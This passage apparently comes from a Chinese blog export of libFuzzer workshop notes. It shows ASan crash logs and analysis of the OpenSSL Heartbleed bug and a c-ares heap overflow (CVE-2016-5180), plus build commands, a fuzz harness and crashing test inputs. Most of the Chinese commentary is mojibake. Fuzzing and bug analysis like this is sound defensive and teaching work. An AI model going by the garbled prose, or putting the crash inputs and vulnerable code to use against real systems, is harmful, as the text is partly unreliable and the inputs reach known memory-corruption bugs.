rss: 382Mb L: 61/77 MS: 1 EraseBytes-===================================================================2133==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x00000051eaba bp 0x7ffd255dae50 sp 0x7ffd255da618READ of size 21050 at 0x629000009748 thread T0 #0 0x51eab9 in __asan_memcpy /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 #1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3 #2 0x5cb97d in ssl3_read_bytes /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:1092:4 #3 0x5cff83 in ssl3_get_message /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:457:7 #4 0x59ac86 in ssl3_get_client_hello /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:941:4 #5 0x596ac1 in ssl3_accept /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:357:9 #6 0x5518ad in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer.cc:39:3 #7 0x459a01 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #8 0x459245 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #9 0x45b4e7 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #10 0x45c205 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #11 0x449fc8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #12 0x473432 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #13 0x7f40a3932bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #14 0x41e159 in _start (/home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer2+0x41e159)0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)allocated by thread T0 here: #0 0x51f67d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x60091b in CRYPTO_malloc /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/mem.c:308:8 #2 0x5d1737 in freelist_extract /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:708:12 #3 0x5d1737 in ssl3_setup_read_buffer /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:770:10 #4 0x5d1d4c in ssl3_setup_buffers /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:827:7 #5 0x597703 in ssl3_accept /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:292:9 #6 0x5518ad in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer.cc:39:3 #7 0x459a01 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #8 0x45b8a5 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:740:3 #9 0x45be79 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:793:3 #10 0x449fc8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #11 0x473432 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #12 0x7f40a3932bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpyShadow bytes around the buggy address: 0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa 0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==2133==ABORTINGMS: 2 ChangeBinInt-InsertByte-; base unit: 7bfa057a7ae6a7bc6ea487749407e4e7d4e9bf840x15,0x3,0xd4,0x0,0x7,0x1,0x3a,0x1,0x3a,0x1,0xd3,0xb3,0x18,0x3,0xd4,0x0,0x7,0x1,0x52,0x3a,0x1,0x3a,0x9,0xd3,0xb3,0x18,0x2c,0x0,0x7,0x2,0x7,0x1,0x3a,0x1,0x0,\\x15\\x03\\xd4\\x00\\x07\\x01:\\x01:\\x01\\xd3\\xb3\\x18\\x03\\xd4\\x00\\x07\\x01R:\\x01:\\x09\\xd3\\xb3\\x18,\\x00\\x07\\x02\\x07\\x01:\\x01\\x00artifact_prefix='./'; Test unit written to ./crash-4bfb53055de3fed318590b20ddd4cda0d95e8ed8Base64: FQPUAAcBOgE6AdOzGAPUAAcBUjoBOgnTsxgsAAcCBwE6AQA= é€šè¿‡SUMMARYå®¹æ˜“æ‰¾åˆ°é€ æˆheap_overflowçš„æ¼æ´ç‚¹åœ¨äº:/local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpyè¿™ç§ç›®å½•ä¸€çœ‹å°±æ˜¯å¾ˆåº•å±‚çš„ç›®å½•ï¼Œä¸æ˜“å®šä½ã€‚å†å¾€æ‰¾ä¸€å±‚:#1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3è¿™å°±å¾ˆå®¹æ˜“å®šä½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ¼æ´æº¯æºäº†ã€‚å®šä½åˆ°äº†ä»£ç : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667tls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; /* Use minimum padding */ /* Read type and payload length first */ hbtype = *p++; n2s(p, payload); pl = p; if (s-&gt;msg_callback) s-&gt;msg_callback(0, s-&gt;version, TLS1_RT_HEARTBEAT, &amp;s-&gt;s3-&gt;rrec.data[0], s-&gt;s3-&gt;rrec.length, s, s-&gt;msg_callback_arg); if (hbtype == TLS1_HB_REQUEST) { unsigned char *buffer, *bp; int r; /* Allocate memory for the response, size is 1 bytes * message type, plus 2 bytes payload length, plus * payload, plus padding */ buffer = OPENSSL_malloc(1 + 2 + payload + padding); bp = buffer; /* Enter response type, length and copy payload */ *bp++ = TLS1_HB_RESPONSE; s2n(payload, bp); memcpy(bp, pl, payload); //æ¼æ´ç‚¹ bp += payload; /* Random padding */ RAND_pseudo_bytes(bp, padding); r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); if (r &gt;= 0 &amp;&amp; s-&gt;msg_callback) s-&gt;msg_callback(1, s-&gt;version, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding, s, s-&gt;msg_callback_arg); OPENSSL_free(buffer); if (r &lt; 0) return r; } else if (hbtype == TLS1_HB_RESPONSE) { unsigned int seq; /* We only send sequence numbers (2 bytes unsigned int), * and 16 random bytes, so we just try to read the * sequence number */ n2s(pl, seq); if (payload == 18 &amp;&amp; seq == s-&gt;tlsext_hb_seq) { s-&gt;tlsext_hb_seq++; s-&gt;tlsext_hb_pending = 0; } } return 0; } æ¼æ´ç‚¹å†memcpy(bp, pl, payload);æ ¹æ®crashåŸå› ä¸ºover_flowè¯´æ˜payloadçš„é•¿åº¦æœ‰é—®é¢˜ã€‚å¾€ä¸Šåˆ†æå‘ç°payloadæ˜¯é€šè¿‡n2så‡½æ•°ä»pæŒ‡å‘çš„ç»“æ„ä½“ï¼ˆç”¨æˆ·æ•°æ®åŒ…ï¼‰å†…å®¹å¾—åˆ°çš„ã€‚è¯¥ç»“æ„ä½“ä¸ºï¼š 1234567891011typedef struct ssl3_record_st { int type; / type of record / unsigned int length; / How many bytes available / unsigned int off; / read/write offset into 'buf' / unsigned char data; / pointer to the record data / unsigned char input; / where the decode bytes are / unsigned char comp; / only used with decompression - malloc()ed / unsigned long epoch; / epoch number, needed by DTLS1 / unsigned char seq_num[8]; / sequence number, needed by DTLS1 / } SSL3_RECORD; è€Œç¨‹åºå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·å¯æ§çš„lengthåšæ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´memcpyæº¢å‡ºï¼ˆæœ‰å¯èƒ½å°†serverç«¯çš„æ•°æ®å†™å…¥åˆ°è¿”å›æ•°æ®åŒ…ä¸­è¿”å›ç»™ç”¨æˆ·ï¼‰ã€‚ åˆå­¦libfuzzerï¼Œå¦‚æœ‰çº°æ¼é”™è¯¯è¿˜çƒ¦è¯·å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚ lesson06 gogogo!06ç»™å‡ºçš„æ˜¯CVE-2016-5180æ¼æ´ï¼Œè¯¥æ¼æ´å¯ä»¥å®ç°åœ¨ChromeOSä¸‹çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ— ç–‘æ˜¯é«˜å±æ¼æ´ã€‚PSï¼šæˆ‘è§‰å¾—åœ¨å­¦ä¹ libfuzzerçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…ä»…å±€é™å±€é™äºè·å¾—äº†ä¸€ä¸ªcrashï¼Œè¿˜è¦è¿›ä¸€æ­¥çš„å»å®šä½æ¼æ´ä¹‹æ‰€åœ¨ï¼Œåˆ†ææ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæ€è€ƒæ¼æ´çš„åˆ©ç”¨æ–¹æ³•å’Œä¿®è¡¥æ–¹å¼ï¼Œè¿™æ‰æ˜¯æ­£ç¡®å¯¹å¾…fuzzçš„æ€åº¦ä»¥åŠæ¼æ´æŒ–æ˜çš„é­…åŠ›æ‰€åœ¨ã€‚å¦‚åŒ05æ‰€ä½œçš„æ­¥éª¤ï¼Œæˆ‘ä»¬è¦å…ˆå¯¹å¼€æºåº“è¿›è¡Œç¼–è¯‘ å¦‚æœæˆ‘ä»¬å•çº¯ç›´æ¥ç¼–è¯‘è€Œä¸è¿›è¡Œç¼–è¯‘æ’æ¡©çš„è¯: 12345tar xzvf c-ares.tgzcd c-ares./buildconf./configuremake å¾—åˆ°çš„fuzzæ•ˆæœä¸ºï¼š 123456789101112131415âœ 06 git:(master) âœ— ./c_ares_fuzzer INFO: Seed: 2221841816INFO: Loaded 1 modules (14 inline 8-bit counters): 14 [0x7a7ef8, 0x7a7f06), INFO: Loaded 1 PC tables (14 PCs): 14 [0x5700b8,0x570198), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 4 ft: 5 corp: 1/1b exec/s: 0 rss: 27Mb#5 NEW cov: 5 ft: 6 corp: 2/3b lim: 4 exec/s: 0 rss: 27Mb L: 2/2 MS: 3 ShuffleBytes-ChangeByte-CopyPart-#1337 NEW cov: 8 ft: 9 corp: 3/20b lim: 17 exec/s: 0 rss: 27Mb L: 17/17 MS: 2 ShuffleBytes-CrossOver-#1357 REDUCE cov: 8 ft: 9 corp: 3/19b lim: 17 exec/s: 0 rss: 27Mb L: 16/16 MS: 5 CrossOver-EraseBytes-CopyPart-ChangeBinInt-InsertRepeatedBytes-#524288 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 712Mb#1048576 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 775Mb#2097152 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 777Mb#4194304 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 246723 rss: 777Mb#8388608 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 220752 rss: 777Mb å‡ºç°å¦‚æ­¤boringçš„ç»“æœçš„åŸå› å†ä¸ç¼ºå°‘äº†ç¼–è¯‘æ—¶çš„é€‰é¡¹è®¾ç½®ï¼Œå³æ²¡æœ‰åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ’æ¡©æ’æ¡©æ“ä½œï¼šåœ¨å…¶ä¸­ç‰¹å®šçš„çš„ä½ç½®æ’å…¥æ±‡ç¼–ä»£ç ï¼Œå®ç°åœ¨ç¨‹åºæ‰§è¡Œåˆ°è¯¥å¤„æ—¶èƒ½å¤Ÿé€šè¿‡æ­¤å¤„çš„æ’æ¡©æŒæ¡ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ 12345tar xzvf c-ares.tgzcd c-ares./buildconf./configure CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;make CFLAGS= è¿™é‡Œçš„-fsanitize=addresså³å¼€å¯ASAN(Address Sanitizer)ï¼Œç¼–è¯‘æ—¶åˆ™ä¼šåœ¨ç›®æ ‡ä»£ç çš„å…³é”®ä½ç½®æ·»åŠ æ£€æŸ¥ä»£ç ï¼Œä¾‹å¦‚ï¼šmalloc(),free()ç­‰ï¼Œä¸€æ—¦å‘ç°äº†å†…å­˜è®¿é—®é”™è¯¯ï¼Œä¾¿å¯ä»¥SIGABRTä¸­æ­¢ç¨‹åºã€‚ï¼ˆå³å®Œæˆäº†ç¼–è¯‘æ’æ¡©ï¼‰è¿™é‡ŒæŒ‡å®šCCé€‰é¡¹ä¹Ÿæ˜¯ä¸è§„èŒƒçš„ï¼Œæå€¡CC = &quot;clang&quot; &amp;&amp; CFLAGS = &quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;é¡ºåˆ©ç¼–è¯‘ç”Ÿæˆ.aé™æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œæ¥ç€æ˜¯ç¼–å†™fuzzeræ¥å£å‡½æ•°ã€‚workshopæä¾›ç»™æˆ‘ä»¬çš„harnesså¦‚ä¸‹: 12345678910111213141516171819// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/nameser.h&gt;#include &lt;string&gt;#include &lt;ares.h&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { unsigned char *buf; int buflen; std::string s(reinterpret_cast&lt;const char *&gt;(data), size); ares_create_query(s.c_str(), ns_c_in, ns_t_a, 0x1234, 0, &amp;buf, &amp;buflen, 0); ares_free_string(buf); return 0;} å¯ä»¥çœ‹åˆ°harnesså°†è¾“å…¥çš„æµ‹è¯•æ ·æœ¬dataç±»å‹è½¬åŒ–ä¸ºstrings sï¼Œä¹‹åé€‰æ‹©äº†ares_creat_queryå’Œares_free_stringsä½œä¸ºå…¥å£å‡½æ•°æ¥è¿›è¡Œfuzzã€‚ç¼–è¯‘ï¼šclang++ -g c_ares_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer -Ic-ares c-ares/.libs/libcares.aè¿è¡Œåå¾ˆå¿«å¾—åˆ°äº†crashè¯´æ˜æä¾›çš„harnessæ˜¯å¾ˆæœ‰æ•ˆçš„ï¼Œæ¥å£å‡½æ•°çš„é€‰æ‹©åˆé€‚ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576âœ 06 git:(master) âœ— ./c_ares_fuzzer INFO: Seed: 3003118136INFO: Loaded 1 modules (11 inline 8-bit counters): 11 [0x7f72c0, 0x7f72cb), INFO: Loaded 1 PC tables (11 PCs): 11 [0x5b7740,0x5b77f0), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 4 ft: 4 corp: 1/1b exec/s: 0 rss: 27Mb#10 NEW cov: 5 ft: 5 corp: 2/3b lim: 4 exec/s: 0 rss: 27Mb L: 2/2 MS: 3 ShuffleBytes-CrossOver-InsertByte-#1336 NEW cov: 7 ft: 7 corp: 3/20b lim: 17 exec/s: 0 rss: 27Mb L: 17/17 MS: 1 CrossOver-#1385 REDUCE cov: 7 ft: 7 corp: 3/19b lim: 17 exec/s: 0 rss: 27Mb L: 16/16 MS: 4 CopyPart-EraseBytes-InsertByte-CopyPart-===================================================================7322==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000f7b654 at pc 0x00000059bd4c bp 0x7fff83ba42b0 sp 0x7fff83ba42a8WRITE of size 1 at 0x603000f7b654 thread T0 #0 0x59bd4b in ares_create_query /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 #1 0x59b33c in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer.cc:16:3 #2 0x465fe6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #3 0x46b649 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #4 0x46b649 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #5 0x46e66f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #6 0x4569f9 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #7 0x41f382 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #8 0x7f19eeaeabf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #9 0x41f3f9 in _start (/home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer+0x41f3f9)0x603000f7b654 is located 0 bytes to the right of 20-byte region [0x603000f7b640,0x603000f7b654)allocated by thread T0 here: #0 0x552ef0 in malloc /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:145 #1 0x59b826 in ares_create_query /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:133:10 #2 0x59b33c in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer.cc:16:3 #3 0x465fe6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #4 0x46b649 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #5 0x46b649 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #6 0x46e66f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #7 0x4569f9 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #8 0x41f382 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #9 0x7f19eeaeabf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_queryShadow bytes around the buggy address: 0x0c06801e7670: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa 0x0c06801e7680: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa 0x0c06801e7690: fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd 0x0c06801e76a0: fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa 0x0c06801e76b0: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa=&gt;0x0c06801e76c0: fa fa fd fd fd fa fa fa 00 00[04]fa fa fa fa fa 0x0c06801e76d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e76e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e76f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e7700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e7710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==7322==ABORTINGMS: 4 ChangeByte-ChangeBinInt-CopyPart-ChangeBit-; base unit: 900229d109e2354708da1b4fe903c1ef0e741ab80xdc,0x2e,0x5c,0x2e,\\xdc.\\\\.artifact_prefix='./'; Test unit written to ./crash-55bfecc1f01482c0ec080b0da9ab7f50cd9fa363Base64: 3C5cLg== SUMMARYä¸­:SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_queryï¼Œäº†è§£åˆ°æ¼æ´æ­£ä½äºares_create_queryå‡½æ•°ä¸­ã€‚å®šä½ä¸€ä¸‹æ¼æ´ç‚¹ï¼š 1234//ares_create_query.c:196:3/* Finish off the question with the type and class. */DNS_QUESTION_SET_TYPE(q, type);DNS_QUESTION_SET_CLASS(q, dnsclass); //æ¼æ´ç‚¹ï¼Œè¯¥å¤„å­˜åœ¨heap_overflow ä½†å¯¹äºæ¼æ´çš„å…·ä½“äº§ç”Ÿæ–¹å¼è¿›è¡Œæº¯æºçš„è¯å°±è¦å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚ åˆ°è¿™é‡Œå¯¹libfuzzerçš„åŸºæœ¬æ“ä½œå·²ç»æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä½†fuzzçš„å¯¹è±¡éƒ½æ˜¯è§„æ¨¡è¾ƒå°çš„å¼€æºåº“ã€‚å½“æˆ‘ä»¬é¢å¯¹å¤§è§„æ¨¡çš„å¼€æºé¡¹ç›®ä»¥åŠéœ€è¦è¿›è¡Œé•¿æ—¶é—´çš„æµ‹è¯•å·¥ä½œæ—¶ï¼Œå¦‚ä½•ç»§ç»­ä¿æŒfuzzçš„é«˜æ•ˆè¿›è¡Œä»¥å¾—åˆ°crashä¾¿æ˜¯æˆ‘ä»¬è¦ç»§ç»­ç ”ç©¶çš„è¯¾é¢˜ï¼Œè¿™å°±æ¶‰åŠåˆ°ä¸€äº›å¯¹ç¼–è¯‘é€‰é¡¹çš„è®¾ç½®ä»¥åŠå¯¹fuzzçš„ä¸€äº›é¢å¤–æ¡ä»¶çš„è®¾å®šï¼Œè¿™äº›éƒ½ä¼šå¯èƒ½ä¼šå½±å“åˆ°fuzzçš„æ•ˆç‡ï¼Œç­‰å¾…è¿™æˆ‘ä»¬è¿›ä¸€æ­¥çš„ç ”ç©¶ã€‚","link":"/2020/12/17/LibFuzzer(1)/"},{"title":"ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰","text":"æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼š https://www.anquanke.com/post/id/225957 LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰ ä¸Šä¸€ç¯‡å¯¹libfuzzerçš„åŸç†å’Œä½¿ç”¨æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼Œæ¥ä¸‹æ¥å°±åˆ°è¿›é˜¶çš„å†…å®¹äº†ï¼Œä¼šæ¶‰åŠåˆ°å­—å…¸çš„ä½¿ç”¨ï¼Œè¯­æ–™åº“ç²¾ç®€ï¼Œé”™è¯¯æŠ¥å‘Šç”Ÿæˆä»¥åŠä¸€äº›å…³é”®çš„ç¼–è¯‘é€‰é¡¹çš„é€‰æ‹©ç­‰å†…å®¹ï¼Œå¸Œæœ›èƒ½å¯¹libfuzzeræœ‰æ›´æ·±å…¥çš„å­¦ä¹ ã€‚ lesson 08(dictionaries are so effective)å¯¹libxml2è¿›è¡Œfuzzã€‚é¦–å…ˆå¯¹å…¶è§£å‹å¹¶ç”¨clangç¼–è¯‘ä¹‹ã€‚ 12345678tar xzf libxml2.tgzcd libxml2./autogen.shexport FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc) è§£é‡Šä¸‹æ–°çš„ç¼–è¯‘é€‰é¡¹-gline-tables-only:è¡¨ç¤ºä½¿ç”¨é‡‡æ ·åˆ†æå™¨clangæ‰‹å†Œä¸­å¯¹é‡‡æ ·åˆ†æå™¨çš„è§£é‡Š:Sampling profilers are used to collect runtime information, such as 